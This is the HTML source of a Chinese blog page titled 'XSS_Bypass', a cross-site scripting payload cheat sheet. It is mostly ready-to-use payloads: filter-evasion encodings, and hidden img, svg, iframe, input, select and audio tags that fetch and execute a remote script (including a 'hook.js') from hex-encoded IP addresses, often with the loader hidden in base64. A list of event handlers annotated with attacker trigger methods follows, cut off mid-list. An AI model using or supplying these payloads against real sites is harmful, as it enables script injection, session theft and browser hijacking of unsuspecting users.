@@ -1,0 +1,382 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>XSS_Bypass | bo0s</title>
+  <meta name="author" content="hitman">
+  
+  <meta name="description" content="这是一个模版文件描述，以后就这么写✍️.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="XSS_Bypass"/>
+  <meta property="og:site_name" content="bo0s"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/12favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.0.0"><link rel="stylesheet" href="/css/prism-vs.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">bo0s</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="全部文章">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="标签">
+			  <i class="fa fa-tag"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="我是谁.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/wiki/#/" title="WiKi.">
+			  <i class="fa fa-book"></i>WiKi
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="工具">
+			  <i class="fa fa-space-shuttle"></i>Tool
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/logs" title="日志">
+			  <i class="fa fa-tachometer"></i>Logs
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/code/landing/" title="Discord.JS Bot Code">
+			  <i class="fa fa-code"></i>Tutorials / Code
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> XSS_Bypass</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> 这是一个模版文件描述，以后就这么写✍️.
+		 </div> <!-- alert -->
+	  		
+
+	  <h1 id="特殊bypass"><a href="#特殊bypass" class="headerlink" title="特殊bypass"></a>特殊bypass</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[1].find(alert);</span><br><span class="line">top[&#x27;al\x65rt&#x27;](2);</span><br><span class="line">top[&quot;al&quot;+&quot;ert&quot;](3);</span><br><span class="line">setTimeout(&#x27;ale&#x27;+&#x27;rt(4)&#x27;);</span><br><span class="line">Function(&quot;ale&quot;+&quot;rt(5)&quot;)();</span><br><span class="line">new Function`al\ert\`6\``;</span><br><span class="line">setInterval(&#x27;ale&#x27;+&#x27;rt(7)&#x27;);</span><br><span class="line">top[8680439..toString(30)](8);</span><br><span class="line">top[/al/.source+/ert/.source](9);</span><br><span class="line">open(&#x27;java&#x27;+&#x27;script:ale&#x27;+&#x27;rt(10)&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h1 id="编码变形"><a href="#编码变形" class="headerlink" title="编码变形"></a>编码变形</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">## Base64 编码</span><br><span class="line">eval(atob(&quot;YWxlcnQoMSk=&quot;));</span><br><span class="line"></span><br><span class="line">## 十六进制 编码</span><br><span class="line">eval(&#x27;alert\x281\x29&#x27;);</span><br><span class="line"></span><br><span class="line">## 八进制 编码</span><br><span class="line">eval(&#x27;a\154ert(1)&#x27;);</span><br><span class="line"></span><br><span class="line">## Function 执行代码</span><br><span class="line">Function(&quot;alert(1)&quot;)()</span><br><span class="line"></span><br><span class="line">## ` 代替括号</span><br><span class="line">Function`alert(1)`()</span><br><span class="line">Function`alert(1)```</span><br><span class="line">Function`alert\x281\x29```</span><br><span class="line"></span><br><span class="line">## - 替换 ;</span><br><span class="line">var app=&#x27;&#x27;-Function(&quot;console.log`test_-`&quot;)()-&#x27;&#x27;;</span><br><span class="line">var app=&#x27;&#x27;;Function(&quot;console.log`test_;`&quot;)();&#x27;&#x27;;</span><br><span class="line">Function(atob(&#x27;Y29uc29sZS5sb2dgVGVzdGA=&#x27;))()-&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a> 
+
+<h1 id="SCRIPT"><a href="#SCRIPT" class="headerlink" title="SCRIPT"></a>SCRIPT</h1><ul>
+<li>src[链接]<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>/<span class="attr">src</span>=<span class="string">//0xc0a832e8</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="LINK"><a href="#LINK" class="headerlink" title="LINK"></a>LINK</h1><ul>
+<li><p>href[链接外部样式]</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LINK</span>/<span class="attr">HREF</span>=<span class="string">&quot;//0xc0a832e8&quot;</span> <span class="attr">REL</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">HREF</span>=<span class="string">&quot;//0xc0a832e8&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>import[导入外部样式]</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="css"><span class="keyword">@import</span>&#x27;//0xc0a832e8&#x27;;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="css"><span class="keyword">@imp</span>\ort&#x27;//0xc0a832e8&#x27;;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="css"><span class="keyword">@import</span>&#x27;//0xc0a832e8&#x27;;</span></span><br><span class="line"># 这条非必要不用，注释符</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@import&#x27;//0xc0a832e8&#x27;;//</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="INPUT"><a href="#INPUT" class="headerlink" title="INPUT"></a>INPUT</h1><ul>
+<li>onfocus[输入框]<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;opacity:0&quot;</span> <span class="attr">onfocus</span>=<span class="string">eval(atob(this.id))</span> <span class="attr">id</span>=<span class="string">dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vMHhjMGE4MzJlOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs</span>= <span class="string">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="IMG"><a href="#IMG" class="headerlink" title="IMG"></a>IMG</h1><ul>
+<li><p>onerror[错误事件]</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&#x27;opacity:0&#x27;</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">s</span>=<span class="string">createElement(</span>&#x27;<span class="attr">script</span>&#x27;);<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">&#x27;//0xc0a832e8&#x27;</span>;&gt;</span></span><br><span class="line"></span><br><span class="line">## constructor 替换 eval</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">style</span>=<span class="string">display:none</span> <span class="attr">id</span>=<span class="string">dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vMHhjMGE4MzJlOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs</span>= <span class="string">onerror</span>=<span class="string">[][</span>&quot;<span class="attr">fill</span>&quot;][&quot;<span class="attr">constructor</span>&quot;](<span class="attr">atob</span>(<span class="attr">this.id</span>))()&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">style</span>=<span class="string">display:none</span> <span class="attr">id</span>=<span class="string">dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vMHhjMGE4MzJlOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs</span>= <span class="string">onerror</span>=<span class="string">[][$</span>=<span class="string">&#x27;constructor&#x27;</span>][$](<span class="attr">atob</span>(<span class="attr">this.id</span>))()&gt;</span></span><br><span class="line"></span><br><span class="line">## Function 替换 eval</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">style</span>=<span class="string">display:none</span> <span class="attr">id</span>=<span class="string">dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vMHhjMGE4MzJlOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs</span>= <span class="string">onerror</span>=<span class="string">Function(atob(this.id))()</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>base64_encode</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">display:none</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">id</span>=<span class="string">dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vMHhjMGE4MzJlOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs</span>= <span class="string">onerror</span>=<span class="string">eval(atob(this.id))</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>url_encode</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">#</span> <span class="attr">style</span>=<span class="string">display:none</span> <span class="attr">onerror</span>=<span class="string">eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2F0xc0a832e8%3f%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>html_encoed</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">#</span> <span class="attr">style</span>=<span class="string">display:none</span> <span class="attr">onerror</span>=<span class="string">eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2F0xc0a832e8%3f%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h1><ul>
+<li><p>onload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">import(</span>&quot;//<span class="attr">0xc0a832e8</span>);//</span></span><br><span class="line">&lt;svg/onload=import(/\\0xc0a832e8/)&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">s</span>=<span class="string">eval(atob(</span>&#x27;<span class="attr">Y3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7</span>&#x27;));<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">&#x27;//0xc0a8331c/hook.js&#x27;</span>;</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line">&lt;svg/onload=s=createElement(&#x27;script&#x27;);body.appendChild(s);s.src=&#x27;//0xc0a8331c/hook.js&#x27;;//</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">s</span>=<span class="string">eval(atob(</span>&#x27;<span class="attr">Y3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7</span>&#x27;));<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">&#x27;//0xc0a8331c/hook.js&#x27;</span>;//</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>animate</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onbegin</span>=<span class="string">import(</span>&quot;//<span class="attr">0xc0a832e8</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onbegin</span>=<span class="string">import(</span>&quot;//<span class="attr">0xc0a832e8</span>&quot;) <span class="attr">attributeName</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>discard</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">discard</span> <span class="attr">onbegin</span>=<span class="string">[1].find(alert)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="IFRAME"><a href="#IFRAME" class="headerlink" title="IFRAME"></a>IFRAME</h1><blockquote>
+<p>iframe 标签如果不闭合 会导致页面显示异常；</p>
+</blockquote>
+<ul>
+<li>javascript<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">src</span>=<span class="string">javascript:eval(atob(</span>&#x27;<span class="attr">dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vMHhjMGE4MzJlOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs</span>=<span class="string">&#x27;)) hidden&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string"># 无script,eval [html实体编码]</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;iframe/src=&#x27;</span>&amp;#<span class="attr">x0a</span>&amp;#<span class="attr">x006a</span>;<span class="attr">ava</span>&amp;#<span class="attr">x0073</span>&amp;#<span class="attr">x0063</span>&amp;#<span class="attr">x0072</span>;<span class="attr">ipt</span>&amp;#<span class="attr">x003atop</span>[<span class="attr">693741..toString</span>(<span class="attr">36</span>)]&amp;<span class="attr">lpar</span>;<span class="attr">atob</span>(`<span class="attr">dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vMHhjMGE4MzJlOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs</span>=`))&#x27; <span class="attr">hidden</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h1><blockquote>
+<p>select 标签如果不闭合 会导致页面显示异常；</p>
+</blockquote>
+<ul>
+<li>onfocus<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">eval(atob(this.id))</span> <span class="attr">id</span>=<span class="string">dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vMHhjMGE4MzJlOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs</span>= <span class="string">autofocus</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="AUDIO"><a href="#AUDIO" class="headerlink" title="AUDIO"></a>AUDIO</h1><blockquote>
+<p>audio 标签如果不闭合 会导致页面显示异常；</p>
+</blockquote>
+<ul>
+<li>onerror<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span>/<span class="attr">src</span>  <span class="attr">onerror</span>=<span class="string">eval(atob(this.id))</span> <span class="attr">id</span>=<span class="string">dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vMHhjMGE4MzJlOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs</span>= <span class="string">hidden</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="编码事件"><a href="#编码事件" class="headerlink" title="编码事件"></a>编码事件</h1><blockquote>
+<p>可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码（支持HTML, Octal, Decimal,Hexadecimal, and Unicode）</p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">href=</span><br><span class="line">action=</span><br><span class="line">formaction=</span><br><span class="line">location=</span><br><span class="line">on*=</span><br><span class="line">name=</span><br><span class="line">background=</span><br><span class="line">poster=</span><br><span class="line">src=</span><br><span class="line">code=</span><br><span class="line">data= //只支持base64</span><br></pre></td></tr></table></figure>
+
+<h1 id="事件大全"><a href="#事件大全" class="headerlink" title="事件大全"></a>事件大全</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">FSCommand() （攻击者可以在嵌入式Flash对象中执行时使用此功能）</span><br><span class="line">onAbort() （当用户中止加载图像时）</span><br><span class="line">onActivate() （当对象设置为活动元素时）</span><br><span class="line">onAfterPrint() （在用户打印或预览打印作业后激活）</span><br><span class="line">onAfterUpdate() （在更新源对象中的数据后激活数据对象）</span><br><span class="line">onBeforeActivate() （在将对象设置为活动元素之前触发）</span><br><span class="line">onBeforeCopy()（攻击者在选择复制到剪贴板之前执行攻击字符串 - 攻击者可以使用该execCommand(&quot;Copy&quot;)功能执行此操作）</span><br><span class="line">onBeforeCut() （攻击者在切换选择之前执行攻击字符串）</span><br><span class="line">onBeforeDeactivate() （从当前对象更改activeElement后立即触发）</span><br><span class="line">onBeforeEditFocus() （在可编辑元素中包含的对象进入UI激活状态或选择可编辑容器对象时触发）</span><br><span class="line">onBeforePaste()（用户需要被欺骗粘贴或使用该execCommand(&quot;Paste&quot;)功能强制进入）</span><br><span class="line">onBeforePrint()（用户需要被欺骗打印或攻击者可以使用print()或execCommand(&quot;Print&quot;)功能）。</span><br><span class="line">onBeforeUnload() （用户需要被欺骗关闭浏览器 - 攻击者无法卸载窗口，除非它是从父级生成的）</span><br><span class="line">onBeforeUpdate() （在更新源对象中的数据之前激活数据对象）</span><br><span class="line">onBegin() （当元素的时间轴开始时，onbegin事件立即触发）</span><br><span class="line">onBlur() （在加载另一个弹出窗口且窗口失去焦点的情况下）</span><br><span class="line">onBounce() （当marquee对象的behavior属性设置为“alternate”并且选取框的内容到达窗口的一侧时触发）</span><br><span class="line">onCellChange() （数据提供者中的数据更改时触发）</span><br><span class="line">onChange() （select，text或TEXTAREA字段失去焦点，其值已被修改）</span><br><span class="line">onClick() （有人点击表格）</span><br><span class="line">onContextMenu() （用户需要右键点击攻击区域）</span><br><span class="line">onControlSelect() （当用户即将对对象进行控制选择时触发）</span><br><span class="line">onCopy()（用户需要复制某些东西或者可以使用该execCommand(&quot;Copy&quot;)命令来利用它）</span><br><span class="line">onCut()（用户需要复制某些东西或者可以使用该execCommand(&quot;Cut&quot;)命令来利用它）</span><br><span class="line">onDataAvailable() （用户需要更改元素中的数据，否则攻击者可以执行相同的功能）</span><br><span class="line">onDataSetChanged() （当数据源对象公开的数据集发生更改时触发）</span><br><span class="line">onDataSetComplete() （触发表示所有数据都可从数据源对象获得）</span><br><span class="line">onDblClick() （用户双击表单元素或链接）</span><br><span class="line">onDeactivate() （当activeElement从当前对象更改为父文档中的另一个对象时触发）</span><br><span class="line">onDrag() （要求用户拖动对象）</span><br><span class="line">onDragEnd() （要求用户拖动对象）</span><br><span class="line">onDragLeave() （要求用户将对象拖出有效位置）</span><br><span class="line">onDragEnter() （要求用户将对象拖动到有效位置）</span><br><span class="line">onDragOver() （要求用户将对象拖动到有效位置）</span><br><span class="line">onDragDrop() （用户将对象（例如文件）放到浏览器窗口中）</span><br><span class="line">onDragStart() （当用户开始拖动操作时发生）</span><br><span class="line">onDrop() （用户将对象（例如文件）放到浏览器窗口中）</span><br><span class="line">onEnd() （当时间线结束时，onEnd事件将触发。</span><br><span class="line">onError() （加载文档或图像会导致错误）</span><br><span class="line">onErrorUpdate() （在更新数据源对象中的关联数据时发生错误时在数据绑定对象上触发）</span><br><span class="line">onFilterChange() （当可视过滤器完成状态更改时触发）</span><br><span class="line">onFinish() （当marquee完成循环时，攻击者可以创建漏洞）</span><br><span class="line">onFocus() （攻击者在窗口获得焦点时执行攻击字符串）</span><br><span class="line">onFocusIn() （攻击者在窗口获得焦点时执行攻击字符串）</span><br><span class="line">onFocusOut() （当窗口失去焦点时，攻击者执行攻击字符串）</span><br><span class="line">onHashChange() （当文档当前地址的片段标识符部分发生更改时触发）</span><br><span class="line">onHelp() （攻击者在窗口聚焦时用户点击F1时执行攻击字符串）</span><br><span class="line">onInput() （通过用户界面更改元素的文本内容）</span><br><span class="line">onKeyDown() （用户按下一个键）</span><br><span class="line">onKeyPress() （用户按下或按住键）</span><br><span class="line">onKeyUp() （用户发布密钥）</span><br><span class="line">onLayoutComplete() （用户必须打印或打印预览）</span><br><span class="line">onLoad() （攻击者在窗口加载后执行攻击字符串）</span><br><span class="line">onLoseCapture()（可以通过该releaseCapture()方法利用）</span><br><span class="line">onMediaComplete() （当使用流媒体文件时，此事件可能会在文件开始播放之前触发）</span><br><span class="line">onMediaError() （用户在浏览器中打开包含媒体文件的页面，并在出现问题时触发事件）</span><br><span class="line">onMessage() （文件收到消息时开火）</span><br><span class="line">onMouseDown() （攻击者需要让用户点击图像）</span><br><span class="line">onMouseEnter() （光标在对象或区域上移动）</span><br><span class="line">onMouseLeave() （攻击者需要让用户将鼠标悬停在图像或表格上然后再关闭）</span><br><span class="line">onMouseMove() （攻击者需要让用户将鼠标悬停在图像或表格上）</span><br><span class="line">onMouseOut() （攻击者需要让用户将鼠标悬停在图像或表格上然后再关闭）</span><br><span class="line">onMouseOver() （光标在对象或区域上移动）</span><br><span class="line">onMouseUp() （攻击者需要让用户点击图像）</span><br><span class="line">onMouseWheel() （攻击者需要让用户使用他们的鼠标滚轮）</span><br><span class="line">onMove() （用户或攻击者会移动页面）</span><br><span class="line">onMoveEnd() （用户或攻击者会移动页面）</span><br><span class="line">onMoveStart() （用户或攻击者会移动页面）</span><br><span class="line">onOffline() （如果浏览器在在线模式下工作并且它开始脱机工作，则会出现）</span><br><span class="line">onOnline() （如果浏览器在离线模式下工作并且它开始在线工作，则会发生）</span><br><span class="line">onOutOfSync() （中断元素播放时间轴定义的媒体的能力）</span><br><span class="line">onPaste()（用户需要粘贴或攻击者可以使用该execCommand(&quot;Paste&quot;)功能）</span><br><span class="line">onPause() （onpause事件触发时间线暂停时活动的每个元素，包括body元素）</span><br><span class="line">onPopState() （用户导航会话历史记录时触发）</span><br><span class="line">onProgress() （攻击者会使用此作为flash电影加载）</span><br><span class="line">onPropertyChange() 